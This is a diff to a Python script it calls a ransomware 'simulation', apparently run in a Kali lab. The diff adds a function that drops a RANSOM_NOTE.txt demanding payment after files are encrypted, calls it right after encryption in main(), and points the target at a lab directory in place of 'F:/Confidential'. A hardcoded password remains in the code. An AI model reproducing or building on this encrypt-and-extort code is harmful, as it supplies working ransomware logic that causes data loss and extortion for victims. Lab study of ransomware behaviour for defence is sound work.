@@ -84,15 +84,24 @@ def decrypt_files(directory, key):
             except ValueError as e:
                 print(f"Error decrypting {file_path}: {e}")
 
+# Generate a ransom note
+def create_ransom_note(directory):
+    note = """Your files have been encrypted! To get them back, you need to pay a ransom. Failure to do so will result in the permanent loss of your files."""
+    note_path = os.path.join(directory, 'RANSOM_NOTE.txt')
+    with open(note_path, 'w') as f:
+        f.write(note)
+    print(f"Ransom note created at: {note_path}")
+
 # Main function to run the simulation
 def main():
-    directory_to_encrypt = "F:/Confidential"
+    directory_to_encrypt = "/home/kali/zphisher/auth"
     password = "SecPass"  # Set a secure password
     hashed_password = hash_password(password)  # Store hashed password
     key = generate_key()
 
     print("Encrypting files...")
     encrypt_files(directory_to_encrypt, key)
+    create_ransom_note(directory_to_encrypt)
     print("Files encrypted.")
 
     # Simulate storing the key securely
